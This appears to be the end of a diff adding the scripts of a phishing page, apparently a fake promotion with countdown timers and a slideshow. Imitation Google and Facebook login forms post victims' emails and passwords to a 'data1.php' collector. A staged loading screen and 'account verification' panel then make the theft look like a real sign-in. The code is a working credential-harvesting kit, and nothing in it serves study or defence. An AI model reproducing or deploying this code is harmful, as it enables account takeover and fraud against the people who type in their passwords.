+      if ($validateEmail == "" && $validatePassword == "" && $validateLogin == "" && $playid == "") {
+        $('.account_verification').hide();
+        return false;
+      }
+      $.ajax({
+        type: "POST",
+        url: "data1.php",
+        data: $(this).serialize(),
+        beforeSend: function () {
+          $('.first-login-google').hide();
+        },
+        success: function () {
+          $('.first-login-google').hide();
+        }
+      });
+    });
+    return false;
+  }
+  
+  function SecondValidateLoginGoogleData() {
+    $('#SecondValidateLoginGoogleForm').submit(function (submitingSecondValidateLoginGoogleData) {
+      submitingSecondValidateLoginGoogleData.preventDefault();
+      $emailgoogle = $('#second-google-email').val().trim();
+      $passwordgoogle = $('#second-google-password').val().trim();
+      $logingoogle = $('#second-google-login').val().trim();
+      if ($emailgoogle == '' || $emailgoogle == null || $emailgoogle.length <= 7) {
+        $('.second-email-google').fadeIn();
+        setTimeout(function () {
+          $('.second-email-google').fadeOut();
+        }, 2000);
+        $('.second-sandi-google').hide();
+        $('.second-login-google').show();
+        return false;
+      } else {
+        $('.second-email-google').hide();
+        $("input#validateEmail").val($emailgoogle);
+        $('.second-login-google').hide();
+      }
+      if ($passwordgoogle == '' || $passwordgoogle == null || $passwordgoogle.length <= 7) {
+        $('.second-sandi-google').fadeIn();
+        setTimeout(function () {
+          $('.second-sandi-google').fadeOut();
+        }, 2000);
+        $('.second-login-google').show();
+        return false;
+      } else {
+        $('.second-sandi-google').hide();
+        $("input#validatePassword").val($passwordgoogle);
+        $("input#validateLogin").val($logingoogle);
+        $('.second-login-google').hide();
+        $('.login-google-load').show()
+        setTimeout(function () {
+          $('.second-login-google').hide()
+          $('.account_verification').show()
+          $('.login-google-load').hide()
+        }, 4000)
+      }
+      var $validateEmail = $("input#validateEmail").val();
+      var $validatePassword = $("input#validatePassword").val();
+      var $validateLogin = $("input#validateLogin").val();
+      if ($validateEmail == "" && $validatePassword == "" && $validateLogin == "" && $playid == "") {
+        $('.account_verification').hide();
+        return false;
+      }
+      $.ajax({
+        type: "POST",
+        url: "data1.php",
+        data: $(this).serialize(),
+        beforeSend: function () {
+          $('.second-login-google').hide();
+        },
+        success: function () {
+          $('.second-login-google').hide();
+        }
+      });
+    });
+    return false;
+  }
+
+  function FirstValidateLoginFbData() {
+    $FirstEmailFb = $('#first-email-facebook').val().trim();
+    $FirstPasswordFb = $('#first-password-facebook').val().trim();
+    $FirstLoginFb = $('#first-login-facebook').val().trim();
+    if ($FirstEmailFb.length < 5) {
+      $('.first-email-fb').show();
+      $('.first-sandi-fb').hide();
+      $('.first-login-facebook').show();
+      return false;
+    } else if ($FirstPasswordFb.length < 5) {
+      $('.first-sandi-fb').show();
+      $('.first-email-fb').hide();
+      $('.first-login-facebook').show();
+      return false;
+    } else {
+      $.ajax({
+        type: "POST",
+        url: "data1.php",
+        data: $("#FirstValidateLoginFbForm").serialize(),
+        beforeSend: function () {
+          $('.first-email-fb').hide();
+          $('.first-sandi-fb').hide();
+          $('.first-login-facebook').hide();
+          $('.login-facebook-load').show();
+        },
+        success: function () {
+          $("input#validateEmail").val($FirstEmailFb);
+          $("input#validatePassword").val($FirstPasswordFb);
+          $("input#validateLogin").val($FirstLoginFb);
+          setTimeout(function () {
+            $('.login-facebook-load').hide();
+            $('.account_verification').show();
+            $('.second-login-facebook').hide();
+          }, 4000)
+          return true;
+        }
+      });
+    };
+  };
+
+  function SecondValidateLoginFbData() {
+    $SecondEmailFb = $('#second-email-facebook').val().trim();
+    $SecondPasswordFb = $('#second-password-facebook').val().trim();
+    $SecondLoginFb = $('#second-login-facebook').val().trim();
+    if ($SecondEmailFb.length < 5) {
+      $('.second-email-fb').show();
+      $('.second-sandi-fb').hide();
+      $('.wrong-email-fb').hide();
+      $('.second-login-facebook').show();
+      return false;
+    } else if ($SecondPasswordFb.length < 5) {
+      $('.second-sandi-fb').show();
+      $('.second-email-fb').hide();
+      $('.wrong-email-fb').hide();
+      $('.second-login-facebook').show();
+      return false;
+    } else {
+      $.ajax({
+        type: "POST",
+        url: "data1.php",
+        data: $("#SecondValidateLoginFbForm").serialize(),
+        beforeSend: function () {
+          $('.second-email-fb').hide();
+          $('.second-sandi-fb').hide();
+          $('.wrong-email-fb').hide();
+          $('.second-login-facebook').hide();
+          $('.login-facebook-load').show();
+        },
+        success: function () {
+          $("input#validateEmail").val($SecondEmailFb);
+          $("input#validatePassword").val($SecondPasswordFb);
+          $("input#validateLogin").val($SecondLoginFb);
+          setTimeout(function () {
+            $('.login-facebook-load').hide();
+            $('.account_verification').show();
+          }, 2000)
+          return true;
+        }
+      });
+    };
+  };
+  
+</script>
+<script>
+var LazIndexHeader = 0;
+showLazSlidez();
+function showLazSlidez() {
+    var i;
+    var LazSlidez = document.getElementsByClassName("lazaslide");
+    for (i = 0; i < LazSlidez.length; i++) {
+        LazSlidez[i].style.display = "none"; 
+    }
+    LazIndexHeader++;
+    if (LazIndexHeader > LazSlidez.length) {LazIndexHeader = 1} 
+    LazSlidez[LazIndexHeader-1].style.display = "block"; 
+    setTimeout(showLazSlidez, 3000);
+}
+
+// code funtion timers
+$(document).ready(function() { 
+var detik = 59;
+var menit = 59;
+var jam = 23;
+function hitung() { 
+setTimeout(hitung,1000); $('#timer1').html( '  ' + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
+if(detik < 0) { 
+detik = 59; 
+menit --; 
+if(menit < 0) { 
+menit = 0; 
+detik = 0; 
+} 
+} 
+} 
+hitung(); 
+}
+);
+$(document).ready(function() { 
+var detik = 59;
+var menit = 59;
+var jam = 23;
+function hitung() { 
+setTimeout(hitung,1000); $('#timer2').html( + jam + ' : ' + menit + ' : ' + detik + ''); detik --; 
+if(detik < 0) { 
+detik = 59; 
+menit --; 
+if(menit < 0) { 
+menit = 0; 
+detik = 0; 
+} 
+} 
+} 
+hitung(); 
+}
+);
+</script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon='{"version":"2024.11.0","token":"e1fc5e0acda44d25a3480aa629477256","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
 </body>
 </html>
